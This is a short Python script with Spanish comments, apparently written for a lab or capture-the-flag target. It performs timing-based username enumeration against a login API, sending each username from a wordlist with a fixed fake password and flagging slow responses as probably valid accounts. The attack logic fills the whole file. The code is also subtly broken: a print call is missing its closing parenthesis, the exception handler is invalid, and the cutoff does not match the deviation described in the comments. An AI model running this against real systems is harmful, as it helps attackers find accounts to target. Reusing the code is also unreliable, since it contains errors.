from typing import cast
import requests as r;
import time;
import csv;

# La idea es hacer el request con un password falopa.
# Si el proceso de login está escrito medio como el orto, van a validar el username y 
# si el mismo es válido va a proceder con el password, haciend que el password ingresado pase
# por todo el proceso de hash para validar con el password de la bd.
# De esta manera, con un usuario invalido al toque ya recibiria el error, mientras que con un usuario
# valido, tardaría unos segundos más.
# Jugando con esos tiempos, puedo saber si un usuario es valido o no, de acuerdo al tiempo que tomo la respuesta.
# Tomo como referencia al tiempo más largo de todos ellos con una desviacion del %10 por ejemplo. 
# Todos los usernames que tarden ese tiempo, son posibles usernames validos.

ip = "10.10.40.72" #CHANGE THIS
url = "http://{}/api/user/login".format(ip); #CHANGE THIS 
print("URL: ", url)

largest_time = 0
psigma = 0.15 #CHANGE THIS
times = dict()

w = csv.writer(open("output/user_time.csv", "w"))
usernames_file = open("wordlist/usernames.txt","r")

def login(user):
    print("Trying login with username: ", user.rstrip(), "...")
    payload = {"username": user, "password": "santu"}
    response = r.post(url, json = payload)
    if(response.status_code != 200):
        print("Error de la API: "+str(response.status_code))

for username in usernames_file:
    times[username.rstrip()]=0
usernames_file.close()

#request TODO trycatch
for user in times:
    try:
        start_time = time.time()
        login(user)
        finish_time = time.time()

        request_time = finish_time-start_time
        times[user] = request_time
        if(request_time > largest_time):
            largest_time = request_time
        time.sleep(0.1) #esto no entendi muy bien el porque, TODO research
    except e:
        print("Error " + str(e)

print("Largest time: ",str(largest_time),"\n");
print("Psigma: ",str(psigma),"\n")

#Ahora veo cuales son usernames candidatos.
candidatos = open("output/candidatos.txt","w");
for user, request_time in times.items():
    if(request_time >= largest_time * psigma):
        print(user," es candidado con un request time de ",str(request_time),"!");
        candidatos.write(user+"\n");
candidatos.close();